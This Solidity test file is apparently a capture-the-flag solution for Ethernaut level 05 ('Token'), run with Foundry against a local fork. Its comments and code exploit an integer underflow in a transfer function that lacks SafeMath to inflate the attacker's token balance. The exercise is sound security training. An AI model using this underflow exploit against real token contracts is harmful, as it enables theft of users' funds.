// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/Test.sol";
import "../src/05_Token.sol";

/*
Author: @BoscoHuang

Attack Process:
- First note that the Solidity version is `^0.6.0` and does not use OpenZeppelin `SafeMath`, so there is a risk of overflow.
- The requirement of this question is to increase the number of tokens, the number of tokens can be changed at the `transfer` function.
- In the contract,  the `balances[msg.sender] -= _value;` can cause an overflow, and the `transfer` function can be called.

Command:
- forge test --match-contract TokenTest --fork-url http://127.0.0.1:8545 -vvv
*/

contract TokenTest is DSTest {
    Token Ethernaut05;

    function setUp() public {
        Ethernaut05 = Token(payable(0x5FbDB2315678afecb367f032d93F642f64180aa3)); // Token address in anvil
    }

    function testEthernaut05() public {
        console.log("Ethernaut05 balance:", Ethernaut05.balanceOf(address(this))); // Balance of the attacker

        Ethernaut05.transfer(address(0), 21);

        assert(Ethernaut05.balanceOf(address(this)) > 20); // Attacker's balance is 100

        console.log("Ethernaut05 balance:", Ethernaut05.balanceOf(address(this)));
    }
}
